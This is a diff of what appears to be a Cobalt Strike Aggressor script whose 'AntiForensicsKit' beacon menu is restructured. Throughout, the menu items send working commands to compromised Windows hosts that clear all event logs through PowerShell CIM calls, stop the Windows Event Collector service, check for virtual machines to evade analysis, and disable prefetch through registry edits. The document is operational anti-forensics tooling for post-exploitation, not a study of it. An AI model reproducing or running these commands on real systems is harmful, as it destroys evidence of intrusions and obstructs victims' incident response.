@@ -3,45 +3,43 @@
 
 popup beacon_bottom {
 	menu "AntiForensicsKit" {
-		menu "Windows" {
-			item "Clear System Event Logs (psh)"{
+		item "Clear System Event Logs (psh)"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+				bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+			}
+		}
+		item "Stop Windows Event Collector svc"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "sc stop wecsvc");
+				bshell($1, "sc stop wecsvc");
+			}
+		}
+		item "Check VM" {
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Check-VM.ps1");
+				bpowershell_import($1, script_resource("scripts/Check-VM.ps1"));
+				binput($1, "powershell Check-VM");
+				bpowershell($1, "Check-VM");
+			}
+		}
+		menu "Prefetch Management" {
+			item "Disable Prefetch" {
 				local('$bid');
-				foreach $bid ($1){
-					binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
-					bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+				foreach $bid ($1) {
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "0"');
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "0"');
+					#bshell($1,'net stop eventlog /f');
 				}
 			}
-			item "Stop Windows Event Collector svc"{
-				local('$bid');
-				foreach $bid ($1){
-					binput($1, "sc stop wecsvc");
-					bshell($1, "sc stop wecsvc");
-				}
-			}
-			item "Check VM" {
-				local('$bid');
-				foreach $bid ($1){
-					binput($1, "powershell-import Check-VM.ps1");
-					bpowershell_import($1, script_resource("scripts/Check-VM.ps1"));
-					binput($1, "powershell Check-VM");
-					bpowershell($1, "Check-VM");
-				}
-			}
-			menu "Prefetch Management" {
-				item "Disable Prefetch" {
+			item "Enable Prefetch" {
 					local('$bid');
 					foreach $bid ($1) {
-						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "0"');
-						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "0"');
-						#bshell($1,'net stop eventlog /f');
-					}
-				}
-				item "Enable Prefetch" {
-						local('$bid');
-						foreach $bid ($1) {
-							bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "3"');
-							bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "1"');
-					}
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "3"');
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "1"');
 				}
 			}
 		}
